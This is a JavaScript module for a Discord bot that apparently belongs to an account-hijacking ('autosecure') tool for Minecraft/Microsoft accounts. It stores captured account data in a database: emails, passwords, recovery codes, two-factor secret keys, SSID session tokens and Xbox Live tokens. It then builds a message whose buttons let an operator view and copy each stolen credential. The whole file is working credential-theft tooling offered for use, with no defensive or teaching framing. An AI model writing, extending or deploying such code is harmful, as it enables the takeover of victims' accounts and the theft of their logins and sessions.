const { EmbedBuilder } = require("@discordjs/builders");
const { ActionRowBuilder, ButtonBuilder, ButtonStyle } = require("discord.js");
const { footer } = require("../../../config.json");
const { queryParams } = require("../../../db/database");
const generate = require("../utils/generate");
const getembedautosec = require("../responses/getembedsautosec");

module.exports = async (acc, uid, client, interaction, claimUsername) => {

    let msg = {};
    let time = Date.now();
    let ssidId = generate(32);
    let secureId = generate(32);
    let copyTextId = generate(32);

    let cleanedkey = acc.secretkey && acc.secretkey !== "Disabled" ? acc.secretkey.replace(/\s+/g, "") : "Disabled";
    let sec = acc.secEmail && acc.secEmail !== "Failed" ? acc.secEmail : "None";

try {
    if (!acc.newName || !acc.email || !acc.password || !acc.secEmail || !acc.recoveryCode || !acc.capes || !acc.mc) {
        console.log("Didn't get all values!");
    }

    let capesForDb = Array.isArray(acc.capes) && acc.capes.length > 0 ? acc.capes.join(", ") : "None";

await Promise.all([
    client.queryParams(
        `INSERT INTO actions(id, action) VALUES(?, ?)`,
        [ssidId, `ssid|${acc.ssid || ""}${acc.xbl ? `|${acc.xbl}` : ""}`]
    ),
client.queryParams(
    `INSERT INTO actions(id, action) VALUES(?, ?)`,
    [secureId, `securedata|${acc.recoverydata.email}|${acc.recoverydata.recovery}|${acc.recoverydata.secemail}|${acc.recoverydata.password}`]
),
        client.queryParams(
            `INSERT INTO actions(id, action) VALUES(?, ?)`,
            [
                copyTextId,
                `copyText|${acc.newName || ""}|${acc.mc || ""}|${capesForDb}|${acc.recoveryCode || ""}|${acc.email || ""}|${sec}|${cleanedkey}|${acc.password || ""}`
            ]
        )
    ]);
} catch (error) {
    console.error("Error inserting into database:", error);
    throw new Error("Failed to insert action data into the database.");
}


    const embed = await getembedautosec(client, "listaccount", acc, interaction, claimUsername);

 msg.embeds = [embed];
    msg.components = [
        new ActionRowBuilder().addComponents(
            new ButtonBuilder()
                .setCustomId(`minecraft|${uid}`)
                .setStyle(ButtonStyle.Primary)
                .setLabel("Minecraft"),
            new ButtonBuilder()
                .setCustomId("ssid|" + ssidId + "|" + time)
                .setLabel("SSID")
                .setStyle(ButtonStyle.Primary),
            new ButtonBuilder()
                .setCustomId("copyText|" + copyTextId)
                .setLabel("Copy Info")
                .setStyle(ButtonStyle.Secondary),
            new ButtonBuilder()
                .setCustomId(`email|${sec}`)
                .setStyle(ButtonStyle.Secondary)
                .setEmoji("📧"),
            new ButtonBuilder()
                .setCustomId(`auth|${cleanedkey}`)
                .setStyle(ButtonStyle.Secondary)
                .setEmoji("🔑")
        ),
        new ActionRowBuilder().addComponents(
            new ButtonBuilder()
                .setCustomId(`extrainformation|${uid}`)
                .setLabel("Extra Information")
                .setStyle(ButtonStyle.Success)
        )
    ];

    return msg;
};
